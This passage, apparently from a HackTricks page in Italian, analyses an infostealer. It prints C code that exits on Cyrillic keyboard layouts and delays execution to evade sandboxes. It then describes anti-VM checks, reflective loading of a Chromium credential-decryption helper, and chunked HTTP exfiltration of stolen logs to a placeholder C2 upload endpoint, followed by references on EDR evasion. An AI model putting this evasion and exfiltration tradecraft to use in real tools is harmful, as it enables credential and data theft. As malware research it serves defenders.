- Una config flag (`anti_cis`) enumera i layout di tastiera installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample deposita un marcatore vuoto `CIS` e termina prima di eseguire gli stealers, garantendo di non detonare mai sulle località escluse mentre lascia un hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logica stratificata di `check_antivm`

- La variante A scorre la lista dei processi, calcola l'hash di ogni nome con un checksum rolling personalizzato e lo confronta con blocklist incorporate per debugger/sandbox; ripete il checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B ispeziona proprietà di sistema (soglia minima del numero di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le Guest additions di VirtualBox e esegue controlli temporali attorno a sleep per individuare single-stepping. Qualsiasi rilevamento abortisce prima del lancio dei moduli.

### Helper fileless + reflective loading doppio ChaCha20

- Il DLL/EXE primario incorpora un Chromium credential helper che viene o droppato su disco o mappato manualmente in-memory; la modalità fileless risolve da sola imports/relocations così nessun artefatto helper viene scritto.
- Quel helper memorizza una DLL di second-stage criptata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambe le passate, carica reflectively il blob (no `LoadLibrary`) e chiama le export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivate da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Le routine di ChromElevator usano direct-syscall reflective process hollowing per iniettare in un Chromium attivo, ereditare le chiavi AppBound Encryption e decriptare password/cookie/carte di credito direttamente dai database SQLite nonostante l'hardening ABE.

### Raccolta modulare in-memory & chunked HTTP exfil

- `create_memory_based_log` itera una tabella globale di puntatori a funzione `memory_generators` e crea un thread per ciascun modulo abilitato (Telegram, Discord, Steam, screenshots, documents, browser extensions, ecc.). Ogni thread scrive i risultati in buffer condivisi e segnala il conteggio dei file dopo una finestra di join di ~45s.
- Una volta terminato, tutto viene zippato con la libreria statically linked `miniz` come `%TEMP%\\Log.zip`. `ThreadPayload1` poi dorme 15s e streamma l'archivio in chunk da 10 MB via HTTP POST a `http://<C2>:6767/upload`, spoofando un boundary browser `multipart/form-data` (`----WebKitFormBoundary***`). Ogni chunk aggiunge `User-Agent: upload`, `auth: <build_id>`, opzionalmente `w: <campaign_tag>`, e l'ultimo chunk appende `complete: true` così il C2 sa che il riassemblaggio è completato.

## Riferimenti

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
